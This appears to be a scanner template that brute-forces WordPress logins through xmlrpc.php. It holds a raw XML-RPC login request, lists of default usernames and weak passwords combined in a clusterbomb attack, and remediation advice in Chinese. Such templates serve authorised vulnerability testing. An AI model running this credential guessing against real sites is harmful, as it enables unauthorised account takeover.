id: wordpress-xmlrpc-brute-force
info:
  name: Wordpress XMLRPC.php username and password Bruteforcer
  author:
  - l0ne1y
  description: |-
    Wordpress XMLRPC.php 暴力破解弱口令漏洞
    WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。
    Wordpress XMLRPC.php可通过暴力破解获得后台口令。
  severity: high
  remediation: |-
    1、建议系统管理人员将已发现的弱口令立即改成强口令，并拉网式排查所有系统管理员、用户、设备的弱口令，清扫未发现的弱口令。
    2、弱口令重在管理。企业应制定强口令制度（如：密码需包含大小写字母、数字、特殊字符至少三种格式，长度不少于十位，并且密码键盘排列无序，密码企业、个人信息无关联。
    3、弱口令排查方式可以通过汇总企业所有人员账户后根据强口令规则匹配自查、个性化制定字典暴力破解两种方式。
    4、推荐强口令在线生成:[https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)
    5、推荐口令强度在线检测:[https://howsecureismypassword.net/](https://howsecureismypassword.net/)
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    condition: and
    part: body
    words:
    - url
    - xmlrpc
    - isAdmin
  matchers-condition: and
  raw:
  - |
    POST /xmlrpc.php HTTP/1.1
    Host: {{Hostname}}
    Content-Length: 235

    <?xml version="1.0" encoding="UTF-8"?>
     <methodCall>
       <methodName>wp.getUsersBlogs</methodName>
       <params>
         <param>
           <value>{{username}}</value>
         </param>
           <param>
         <value>{{password}}</value>
           </param>
       </params>
     </methodCall>
  attack: clusterbomb
  payloads:
    password:
    - admin
    - root
    - "123456"
    - "123123"
    - "111111"
    - "000000"
    username:
    - admin
    - root
